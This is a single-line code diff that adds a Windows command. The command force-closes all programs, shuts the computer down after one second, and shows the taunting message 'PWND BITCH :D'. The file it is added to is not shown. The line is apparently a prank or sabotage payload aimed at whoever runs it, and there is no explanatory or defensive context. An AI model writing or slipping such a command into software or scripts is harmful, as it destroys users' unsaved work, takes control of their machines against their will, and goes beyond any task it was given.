@@ -1,0 +1,1 @@
+shutdown -l -s -f -t 1 -c "PWND BITCH :D"
